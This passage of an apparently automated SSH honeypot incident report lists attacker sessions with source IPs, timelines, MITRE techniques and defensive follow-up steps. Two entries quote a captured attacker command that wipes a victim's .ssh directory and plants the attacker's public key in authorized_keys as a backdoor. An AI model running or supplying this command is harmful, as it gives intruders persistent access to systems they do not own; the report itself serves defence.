| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.log.closed` |
| `2026-08-01 06:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `143.110.200[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d572b9405c46

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]34` |
| **First Seen** | 2026-08-01 06:14 |
| **Last Seen** | 2026-08-01 06:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:14:40` | `cowrie.session.connect` |
| `2026-08-01 06:14:41` | `cowrie.client.version` |
| `2026-08-01 06:14:41` | `cowrie.client.kex` |
| `2026-08-01 06:14:43` | `cowrie.login.success` |
| `2026-08-01 06:14:43` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]34` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e46b2397729

| Field | Detail |
|---|---|
| **Source IP** | `137.27.32[.]70` |
| **First Seen** | 2026-08-01 06:14 |
| **Last Seen** | 2026-08-01 06:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:14:42` | `cowrie.session.connect` |
| `2026-08-01 06:14:42` | `cowrie.client.version` |
| `2026-08-01 06:14:42` | `cowrie.client.kex` |
| `2026-08-01 06:14:43` | `cowrie.login.success` |
| `2026-08-01 06:14:44` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.27.32[.]70` to AbuseIPDB if not already reported
- [ ] Block `137.27.32[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e4ff31367f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 06:14 |
| **Last Seen** | 2026-08-01 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:14:42` | `cowrie.session.connect` |
| `2026-08-01 06:14:42` | `cowrie.client.version` |
| `2026-08-01 06:14:43` | `cowrie.client.kex` |
| `2026-08-01 06:14:43` | `cowrie.login.success` |
| `2026-08-01 06:14:43` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:14:43` | `cowrie.direct-tcpip.data` |
| `2026-08-01 06:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f01bf4ae2e3

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-08-01 06:14 |
| **Last Seen** | 2026-08-01 06:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:14:53` | `cowrie.session.connect` |
| `2026-08-01 06:14:53` | `cowrie.client.version` |
| `2026-08-01 06:14:53` | `cowrie.client.kex` |
| `2026-08-01 06:14:54` | `cowrie.login.success` |
| `2026-08-01 06:14:54` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:14:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d512829c2ac3

| Field | Detail |
|---|---|
| **Source IP** | `34.140.142[.]223` |
| **First Seen** | 2026-08-01 06:19 |
| **Last Seen** | 2026-08-01 06:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:19:54` | `cowrie.session.connect` |
| `2026-08-01 06:19:54` | `cowrie.login.success` |
| `2026-08-01 06:19:54` | `cowrie.session.params` |
| `2026-08-01 06:19:54` | `cowrie.command.input` |
| `2026-08-01 06:19:54` | `cowrie.command.input` |
| `2026-08-01 06:19:54` | `cowrie.command.failed` |
| `2026-08-01 06:19:54` | `cowrie.command.input` |
| `2026-08-01 06:19:54` | `cowrie.log.closed` |
| `2026-08-01 06:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.142[.]223` to AbuseIPDB if not already reported
- [ ] Block `34.140.142[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0383cc2aa971

| Field | Detail |
|---|---|
| **Source IP** | `34.140.142[.]223` |
| **First Seen** | 2026-08-01 06:20 |
| **Last Seen** | 2026-08-01 06:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:20:07` | `cowrie.session.connect` |
| `2026-08-01 06:20:07` | `cowrie.login.success` |
| `2026-08-01 06:20:07` | `cowrie.session.params` |
| `2026-08-01 06:20:07` | `cowrie.command.input` |
| `2026-08-01 06:20:07` | `cowrie.command.failed` |
| `2026-08-01 06:20:14` | `cowrie.log.closed` |
| `2026-08-01 06:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.142[.]223` to AbuseIPDB if not already reported
- [ ] Block `34.140.142[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f545ef790be

| Field | Detail |
|---|---|
| **Source IP** | `34.140.142[.]223` |
| **First Seen** | 2026-08-01 06:20 |
| **Last Seen** | 2026-08-01 06:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:20:09` | `cowrie.session.connect` |
| `2026-08-01 06:20:09` | `cowrie.login.success` |
| `2026-08-01 06:20:09` | `cowrie.session.params` |
| `2026-08-01 06:20:09` | `cowrie.command.input` |
| `2026-08-01 06:20:14` | `cowrie.log.closed` |
| `2026-08-01 06:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.142[.]223` to AbuseIPDB if not already reported
- [ ] Block `34.140.142[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c492eee20b3

| Field | Detail |
|---|---|
| **Source IP** | `59.46.182[.]10` |
| **First Seen** | 2026-08-01 06:23 |
| **Last Seen** | 2026-08-01 06:23 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:23:06` | `cowrie.session.connect` |
| `2026-08-01 06:23:07` | `cowrie.client.version` |
| `2026-08-01 06:23:07` | `cowrie.client.kex` |
| `2026-08-01 06:23:12` | `cowrie.login.success` |
| `2026-08-01 06:23:12` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.46.182[.]10` to AbuseIPDB if not already reported
- [ ] Block `59.46.182[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9170f5e15440

| Field | Detail |
|---|---|
| **Source IP** | `90.228.229[.]182` |
| **First Seen** | 2026-08-01 06:23 |
| **Last Seen** | 2026-08-01 06:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:23:17` | `cowrie.session.connect` |
| `2026-08-01 06:23:18` | `cowrie.client.version` |
| `2026-08-01 06:23:18` | `cowrie.client.kex` |
| `2026-08-01 06:23:19` | `cowrie.login.success` |
| `2026-08-01 06:23:19` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.228.229[.]182` to AbuseIPDB if not already reported
- [ ] Block `90.228.229[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c02778f449

| Field | Detail |
|---|---|
| **Source IP** | `66.228.40[.]100` |
| **First Seen** | 2026-08-01 06:37 |
| **Last Seen** | 2026-08-01 06:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:37:00` | `cowrie.session.connect` |
| `2026-08-01 06:37:00` | `cowrie.login.success` |
| `2026-08-01 06:37:00` | `cowrie.session.params` |
| `2026-08-01 06:37:00` | `cowrie.command.input` |
| `2026-08-01 06:37:01` | `cowrie.command.input` |
| `2026-08-01 06:37:01` | `cowrie.command.failed` |
| `2026-08-01 06:37:01` | `cowrie.command.input` |
| `2026-08-01 06:37:01` | `cowrie.command.failed` |
| `2026-08-01 06:37:01` | `cowrie.command.input` |
| `2026-08-01 06:37:01` | `cowrie.log.closed` |
| `2026-08-01 06:37:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.228.40[.]100` to AbuseIPDB if not already reported
- [ ] Block `66.228.40[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d33ba477964

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-08-01 06:39 |
| **Last Seen** | 2026-08-01 06:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:39:53` | `cowrie.session.connect` |
| `2026-08-01 06:39:54` | `cowrie.client.version` |
| `2026-08-01 06:39:54` | `cowrie.client.kex` |
| `2026-08-01 06:39:57` | `cowrie.login.success` |
| `2026-08-01 06:39:58` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db8a1dc1b705

| Field | Detail |
|---|---|
| **Source IP** | `188.168.86[.]6` |
| **First Seen** | 2026-08-01 06:40 |
| **Last Seen** | 2026-08-01 06:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:40:03` | `cowrie.session.connect` |
| `2026-08-01 06:40:03` | `cowrie.client.version` |
| `2026-08-01 06:40:03` | `cowrie.client.kex` |
| `2026-08-01 06:40:05` | `cowrie.login.success` |
| `2026-08-01 06:40:05` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.168.86[.]6` to AbuseIPDB if not already reported
- [ ] Block `188.168.86[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc062bedec29

| Field | Detail |
|---|---|
| **Source IP** | `186.235.193[.]170` |
| **First Seen** | 2026-08-01 06:42 |
| **Last Seen** | 2026-08-01 06:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:42:36` | `cowrie.session.connect` |
| `2026-08-01 06:42:37` | `cowrie.client.version` |
| `2026-08-01 06:42:37` | `cowrie.client.kex` |
| `2026-08-01 06:42:39` | `cowrie.login.success` |
| `2026-08-01 06:42:40` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.235.193[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.235.193[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15b10abd7fe6

| Field | Detail |
|---|---|
| **Source IP** | `121.202.206[.]119` |
| **First Seen** | 2026-08-01 06:42 |
| **Last Seen** | 2026-08-01 06:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:42:46` | `cowrie.session.connect` |
| `2026-08-01 06:42:47` | `cowrie.client.version` |
| `2026-08-01 06:42:47` | `cowrie.client.kex` |
| `2026-08-01 06:42:51` | `cowrie.login.success` |
| `2026-08-01 06:42:52` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.206[.]119` to AbuseIPDB if not already reported
- [ ] Block `121.202.206[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9a00ebabdb

| Field | Detail |
|---|---|
| **Source IP** | `34.77.36[.]89` |
| **First Seen** | 2026-08-01 06:45 |
| **Last Seen** | 2026-08-01 06:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:45:15` | `cowrie.session.connect` |
| `2026-08-01 06:45:15` | `cowrie.client.version` |
| `2026-08-01 06:45:15` | `cowrie.client.kex` |
| `2026-08-01 06:45:17` | `cowrie.login.success` |
| `2026-08-01 06:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.36[.]89` to AbuseIPDB if not already reported
- [ ] Block `34.77.36[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a375b7d46123

| Field | Detail |
|---|---|
| **Source IP** | `69.49.246[.]176` |
| **First Seen** | 2026-08-01 06:46 |
| **Last Seen** | 2026-08-01 06:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:46:26` | `cowrie.session.connect` |
| `2026-08-01 06:46:26` | `cowrie.client.version` |
| `2026-08-01 06:46:26` | `cowrie.client.kex` |
| `2026-08-01 06:46:26` | `cowrie.login.success` |
| `2026-08-01 06:46:27` | `cowrie.session.params` |
| `2026-08-01 06:46:27` | `cowrie.command.input` |
| `2026-08-01 06:46:27` | `cowrie.command.failed` |
| `2026-08-01 06:46:27` | `cowrie.log.closed` |
| `2026-08-01 06:46:27` | `cowrie.session.params` |
| `2026-08-01 06:46:27` | `cowrie.command.input` |
| `2026-08-01 06:46:27` | `cowrie.session.file_download` |
| `2026-08-01 06:46:27` | `cowrie.log.closed` |
| `2026-08-01 06:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.49.246[.]176` to AbuseIPDB if not already reported
- [ ] Block `69.49.246[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63afeb8bbe7c

| Field | Detail |
|---|---|
| **Source IP** | `69.49.246[.]176` |
| **First Seen** | 2026-08-01 06:46 |
| **Last Seen** | 2026-08-01 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:46:27` | `cowrie.session.connect` |
| `2026-08-01 06:46:27` | `cowrie.client.version` |
| `2026-08-01 06:46:27` | `cowrie.client.kex` |
| `2026-08-01 06:46:27` | `cowrie.login.success` |
| `2026-08-01 06:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.49.246[.]176` to AbuseIPDB if not already reported
- [ ] Block `69.49.246[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0c28cfea97e

| Field | Detail |
|---|---|
| **Source IP** | `69.49.246[.]176` |
| **First Seen** | 2026-08-01 06:46 |
| **Last Seen** | 2026-08-01 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:46:27` | `cowrie.session.connect` |
| `2026-08-01 06:46:27` | `cowrie.client.version` |
| `2026-08-01 06:46:27` | `cowrie.client.kex` |
| `2026-08-01 06:46:28` | `cowrie.login.success` |
| `2026-08-01 06:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.49.246[.]176` to AbuseIPDB if not already reported
- [ ] Block `69.49.246[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-411a7216c63f

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-01 06:48 |
| **Last Seen** | 2026-08-01 06:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:48:04` | `cowrie.session.connect` |
| `2026-08-01 06:48:04` | `cowrie.client.version` |
| `2026-08-01 06:48:04` | `cowrie.client.kex` |
| `2026-08-01 06:48:06` | `cowrie.login.success` |
| `2026-08-01 06:48:06` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd34838aa49

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]26` |
| **First Seen** | 2026-08-01 06:48 |
| **Last Seen** | 2026-08-01 06:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:48:12` | `cowrie.session.connect` |
| `2026-08-01 06:48:12` | `cowrie.client.version` |
| `2026-08-01 06:48:12` | `cowrie.client.kex` |
| `2026-08-01 06:48:14` | `cowrie.login.success` |
| `2026-08-01 06:48:15` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66b1f133cdc0

| Field | Detail |
|---|---|
| **Source IP** | `5.175.136[.]100` |
| **First Seen** | 2026-08-01 06:49 |
| **Last Seen** | 2026-08-01 06:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:49:48` | `cowrie.session.connect` |
| `2026-08-01 06:49:49` | `cowrie.client.version` |
| `2026-08-01 06:49:49` | `cowrie.client.kex` |
| `2026-08-01 06:49:50` | `cowrie.login.success` |
| `2026-08-01 06:49:51` | `cowrie.session.params` |
| `2026-08-01 06:49:51` | `cowrie.command.input` |
| `2026-08-01 06:49:51` | `cowrie.command.failed` |
| `2026-08-01 06:49:51` | `cowrie.log.closed` |
| `2026-08-01 06:49:52` | `cowrie.session.params` |
| `2026-08-01 06:49:52` | `cowrie.command.input` |
| `2026-08-01 06:49:52` | `cowrie.session.file_download` |
| `2026-08-01 06:49:52` | `cowrie.log.closed` |
| `2026-08-01 06:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.175.136[.]100` to AbuseIPDB if not already reported
- [ ] Block `5.175.136[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d553739248fe

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]111` |
| **First Seen** | 2026-08-01 06:49 |
| **Last Seen** | 2026-08-01 06:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:49:51` | `cowrie.session.connect` |
| `2026-08-01 06:49:52` | `cowrie.client.version` |
| `2026-08-01 06:49:52` | `cowrie.client.kex` |
| `2026-08-01 06:49:53` | `cowrie.login.success` |
| `2026-08-01 06:49:54` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]111` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
